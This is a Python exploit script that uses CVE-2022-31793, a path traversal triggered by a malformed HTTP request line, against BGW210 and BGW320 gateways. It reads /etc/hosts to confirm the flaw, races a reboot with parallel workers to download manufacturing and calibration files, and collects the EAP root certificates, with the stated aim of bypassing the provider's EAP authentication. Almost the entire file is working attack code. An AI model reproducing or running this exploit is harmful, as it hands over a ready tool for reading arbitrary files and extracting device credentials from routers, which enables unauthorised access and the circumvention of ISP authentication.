from __future__ import annotations

import argparse
import ctypes
import socket
import time
from enum import Enum
from multiprocessing import Pool, Value
from multiprocessing.sharedctypes import Synchronized
from pathlib import Path

READ_BLOCK_SIZE = 4096


class Model(Enum):
    BGW210 = "BGW210"
    BGW320 = "BGW320"


exit_flag: Synchronized[bool]


def init_pool_processes(the_exit_flag: Synchronized) -> None:  # type: ignore
    """
    Initializes the pool processes.
    """
    global exit_flag
    exit_flag = the_exit_flag


def get_response_body(host: str, port: int, path: str) -> bytes | None:
    """
    Makes an (optimized) request to the given host and port and returns the response body.
    """

    # open a tcp socket, waiting 300ms for the connection to be established
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(0.1)
        try:
            sock.connect((host, port))
        except (socket.timeout, TimeoutError, OSError):
            return None

        try:
            # socket connected, increase the timeout for the rest of the (read/write) operations
            sock.settimeout(1)

            # send the request
            sock.sendall(f"GET a{path} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())

            # read the first 4k bytes
            response = sock.recv(READ_BLOCK_SIZE)

            # read the rest of the response
            while chunk := sock.recv(READ_BLOCK_SIZE):
                response += chunk

            # return the fully split body
            return response.split(b"\r\n\r\n", 1)[1]
        except (socket.timeout, ConnectionResetError):
            return None


def download_job(id: int, host: str, port: int, path: str) -> bytes | None:
    """
    Downloads a path from the given host and port.
    """
    try:
        print(f"[+] Worker {id} starting.")
        while not exit_flag.value:
            try:
                # get the response body (remote file)
                response_body = get_response_body(host, port, path)

                # check the file contents. we're only interested in binary data (i.e., not html which is what you'll normally get)
                if response_body and response_body[0] != ord("<"):
                    exit_flag.value = True
                    return response_body
            except Exception:
                # for now, ignore unhandled errors...
                pass
        return None
    finally:
        print(f"[+] Worker {id} exiting.")


def detect_model(host: str, port: int) -> Model | None:
    """
    Detects the model of the BGW router.
    """
    for model in ["BGW210", "BGW320-500", "BGW320-505"]:
        response_body = get_response_body(host, port, f"/etc/{model}")
        if response_body and "CONFIG_" in str(response_body):
            return Model(model.split("-")[0])

    return None


def exploitable() -> bool:
    """
    Determines if the remote endpoint has CVE-2022-31793 available.
    """
    attempts = 3
    for _ in range(attempts):
        # sleep for exponential backoff
        time.sleep(2**_)
        hosts_file = get_response_body(args.host, args.port, "/etc/hosts")
        if not hosts_file:
            continue
        return "dsldevice" in str(hosts_file)
    raise Exception("Could not determine exploitability status. Is the BGW online?")


def download(args: argparse.Namespace) -> None:
    print(
        """\
[+] BGW-210 and BGW-320 mfg/calibration download (for bypass EAP certificates)
[+] ----------------------------------------
[+] Connect your machine directly to LAN1 on the BGW.
[+] Ensure no other interface on your machine is configured for the 192.168.1/24 subnet.
[+] Configure the IP address of the NIC on your machine to:
[+] IP: 192.168.1.11
[+] Subnet: 255.255.255.0
[+] Gateway: 192.168.1.254
[+] ----------------------------------------
[+] Press Ctrl+C to exit.
[+] ----------------------------------------
[+] Waiting for the BGW to come online..."""
    )

    # wait for the BGW to come online
    while get_response_body(args.host, args.port, "/etc/hosts") is None:
        time.sleep(0.5)

    print("[+] BGW is online. Determining eligibility...")

    if not exploitable():
        print("[-] Downgrade to an earlier firmware version.")
        exit(1)

    # auto-detect the model if not provided
    model = args.force_model
    if not model:
        model = detect_model(args.host, args.port)

        # couldn't detect the model.
        if not model:
            print(
                "[-] Failed to detect model. Please specify the model with the --force-model flag."
            )
            exit(1)

    print(
        f"""\
[+] Firmware compatible. Configured model: {model.value}
[+] ----------------------------------------
[+] *** REBOOT THE {model.value} NOW ***
[+] (This may take up to 3 minutes. After 2 minutes, keep this running and reboot the BGW with the red button on the back.)
[+] ----------------------------------------"""
    )

    path = "/mfg/mfg.dat" if model == Model.BGW210 else "/mfg/calibration_01.bin"
    exit_flag = Value(ctypes.c_bool, False)  # type: ignore

    with Pool(
        initializer=init_pool_processes,
        initargs=(exit_flag,),
        processes=args.parallelism,
    ) as pool:
        results = pool.starmap(
            download_job,
            [(i, args.host, args.port, path) for i in range(args.parallelism)],
        )

        # get the first bytes result. multiple subprocesses may have returned a valid result and we only need one.
        result = next((r for r in results if type(r) is bytes), None)
        if not result:
            print("[-] Download failed.")
            exit(1)

        # write the retrieved calibration file to a file on disk based on the file part of the path parameter
        fname = Path(path).name
        with open(args.out_dir / fname, "wb") as f:
            f.write(result)

        print(f"[+] Download successful. File written to {fname}")

        # if it's a 210, the calibration data is at the last 16384 bytes of the mfg.dat file
        if model == Model.BGW210:
            # write the calibration data to a file
            with open(args.out_dir / "calibration_01.bin", "wb") as f:
                f.write(result[-16384:])
            print(f"[+] {model.value} Calibration data written to calibration_01.bin")

        # also grab the root certificates
        try:
            # get rcertattr.txt, which contains a listing of the root certs used for EAP
            rcertattr = get_response_body(
                args.host, args.port, "/var/etc/rootcert/rcertattr.txt"
            )
            if not rcertattr:
                print("[-] Failed to retrieve root certificates")
                exit(1)

            # each line looks like:
            # 1:1:0:attsubca2030.der
            # 2:1:0:attroot2031.der
            # 3:1:0:attsubca2021.der
            for line in rcertattr.decode().splitlines():
                # file also contains comments
                if line.startswith("#"):
                    continue

                root_cert_filename = line.split(":")[-1]
                rootcert_data = get_response_body(
                    args.host, args.port, f"/var/etc/rootcert/{root_cert_filename}"
                )
                if not rootcert_data or not rootcert_data.startswith(
                    b"\x30\x82"
                ):  # primitive DER check (sequence tag)
                    print(f"[-] Failed to retrieve root cert {root_cert_filename}")
                    continue

                # write the certificate out to out_dir/root_cert_filename
                with open(args.out_dir / root_cert_filename, "wb") as f:
                    f.write(rootcert_data)
        except Exception as e:
            print(f"[-] Failed to retrieve root cert: {e}")
            exit(1)


if __name__ == "__main__":
    # setup initial args
    parser = argparse.ArgumentParser(
        description="Downloads certificate data files from BGW210 and BGW320 routers.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--host", type=str, default="192.168.1.254", help="The host to connect to"
    )
    parser.add_argument("--port", type=int, default=80, help="The port to connect to")
    parser.add_argument(
        "--out-dir",
        type=Path,
        default=Path.cwd(),
        help="The output directory to write the files to",
    )
    parser.add_argument(
        "--force-model",
        type=Model,
        choices=list(Model),
        default=None,
        help="Force the model to download certificate data from",
    )
    parser.add_argument(
        "--parallelism",
        type=int,
        default=2,
        help="The number of parallel requests to make",
    )
    args = parser.parse_args()

    # error out if out_dir doesn't exist
    if not args.out_dir.exists():
        print(f"[-] Output directory {args.out_dir} does not exist.")
        exit(1)

    download(args)
